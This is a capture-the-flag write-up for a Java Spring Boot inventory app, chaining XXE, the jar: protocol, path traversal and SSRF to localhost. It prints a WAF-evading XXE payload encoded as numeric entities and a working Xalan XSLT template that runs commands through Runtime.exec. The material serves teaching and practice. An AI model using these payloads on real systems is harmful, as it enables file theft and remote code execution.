# Warehouse inventory

## The app

The app is a Java Spring Boot application with three endpoints:

- `/upload`: Permit an upload of new inventory; this endpoint makes a validation and adds some fields to the XML
- `/download`: Download the last inventory
- `/admin`: Accessible only from localhost, this endpoint permits admins to view inventory.xml in HTML form with an XLST template

```Note: The upload also has a regex pattern to match some common attacks.```

```Note: To get the flag we have to run cat_flag```



## Bugs

### XXE

Java is vulnerable to XXE by default and supports the `jar:` protocol.

`Jar:` protocol permits the extraction and download of files; Java supports this protocol directly on external entities in XML.

```Note: in Java, if the XXE is a folder, the result of the external entities is an ls.```

### RCE
A tampered XLST template can lead to RCE because we can instance all Java classes as `Runtime`

### Path traversal

In `/admin` we can notice that we have a path traversal so that we can load any file as an XSLT template.


## Exploitation

### Bypass WAF

We don't have the pattern, so we have to try some payload; we notice that the entity declared with `SYSTEM` or `PUBLIC` is denied, but if we set only a string, it works. Like this

```xml
<!ENTITY xxe "test">
```

The string in XML supports HTML entities, so we can write our payload in numerical HTML entities as `parameter entities` and recall it in the `DOCTYPE`

So a single payload:

```xml
<!ENTITY xxe SYSTEM "file:///tmp">
```

will be

```xml
<!ENTITY % a "&#60;&#33;&#69;&#78;&#84;&#73;&#84;&#89;&#32;&#120;&#120;&#101;&#32;&#83;&#89;&#83;&#84;&#69;&#77;&#32;&#34;&#102;&#105;&#108;&#101;&#58;&#47;&#47;&#47;&#116;&#109;&#112;&#34;&#62;"> %a;
```

So the XML parser decodes the numeric entities and, with `%a;` reparse it. So we have XXE

### RCE

We need a malicious `XSLT` template; we can make a Google search and find some exploits, for example:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
                xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:date="http://xml.apache.org/xalan/java/java.util.Date"
                xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
                xmlns:str="http://xml.apache.org/xalan/java/java.lang.String"
                exclude-result-prefixes="date">

    <xsl:output method="text"/>
    <xsl:template match="/">

        <xsl:variable name="cmd"><![CDATA[cat_flag]]></xsl:variable>
        <xsl:variable name="rtObj" select="rt:getRuntime()"/>
        <xsl:variable name="process" select="rt:exec($rtObj, $cmd)"/>
        <xsl:variable name="efgh" select="jv:getInputStream($process)" xmlns:jv="http://xml.apache.org/xalan/java"/>
        <xsl:variable name="ijkl" select="isr:new($efgh)" xmlns:isr="http://xml.apache.org/xalan/java/java.io.InputStreamReader"/>
        <xsl:variable name="mnop" select="br:new($ijkl)" xmlns:br="http://xml.apache.org/xalan/java/java.io.BufferedReader"/>
        <xsl:value-of select="jv:readLine($mnop)" xmlns:jv="http://xml.apache.org/xalan/java"/>
        <xsl:value-of select="jv:readLine($mnop)" xmlns:jv="http://xml.apache.org/xalan/java"/>

    </xsl:template>
</xsl:stylesheet> 
```

This template runs `cat_flag`, reads the output, and prints to the screen.

### Exploit

After this, the exploitation path is clear:

- With XXE and `jar:` protocol, we can download the XLST file in the `/tmp` directory with a random name.
The file is deleted when the request ends, so we need a server that sends the file but does not close the connection. You can see an example in the `exploit.py` file

- Spring is a threaded server, so while the first request is pending, we can send another request with an XXE pointing to `file:///tmp` and retrieve the random name of the malicious XSLT template

- To bypass the block of `localhost` in `/admin`, we can make an XXE payload pointing to `http://localhost:6060/admin?template-file=../../../../tmp/{random_name}`
